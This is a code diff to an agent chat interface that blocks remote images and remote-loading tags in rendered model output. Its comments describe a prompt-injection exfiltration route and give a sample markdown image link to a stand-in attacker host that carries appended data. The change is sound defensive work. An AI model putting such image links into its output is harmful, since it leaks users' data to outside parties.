@@ -94,6 +94,8 @@ import {
   TelemetryPanel,
   useTelemetry,
   useBanditTheme,
+  REMOTE_CONTENT_TAGS,
+  disableRemoteImages,
   type ThemePreference
 } from "@burtson-labs/agent-ui";
 import clsx from "clsx";
@@ -561,6 +563,12 @@ export function App(): JSX.Element {
       linkify: true,
       breaks: true
     });
+    // Model-authored markdown must not be able to fetch remote resources on
+    // render — `![](https://attacker/?d=…)` is an un-prompted outbound GET
+    // carrying whatever the injected content told the agent to append. Blocked
+    // at the renderer (deterministic) with FORBID_TAGS at the sanitizer behind
+    // it. See disableRemoteImages / REMOTE_CONTENT_TAGS in agent-ui.
+    disableRemoteImages(instance);
     const { escapeHtml } = instance.utils;
     // Custom fence renderer:
     // - Diffs become a Claude-style <details> card with +N/−N summary,
@@ -1012,7 +1020,13 @@ export function App(): JSX.Element {
           return `<a ${before}href="${href}" data-workspace-link="${cleaned}"${after}>`;
         }
       );
-      return DOMPurify.sanitize(withLocalLinks, { ADD_ATTR: ['aria-hidden', 'data-workspace-link'] });
+      // FORBID_TAGS strips remote-loading tags from model-authored markdown —
+      // an <img> here is a silent GET that turns prompt injection into an
+      // exfil channel. See REMOTE_CONTENT_TAGS for the full rationale.
+      return DOMPurify.sanitize(withLocalLinks, {
+        ADD_ATTR: ['aria-hidden', 'data-workspace-link'],
+        FORBID_TAGS: REMOTE_CONTENT_TAGS
+      });
     },
     [markdown, balanceFences]
   );
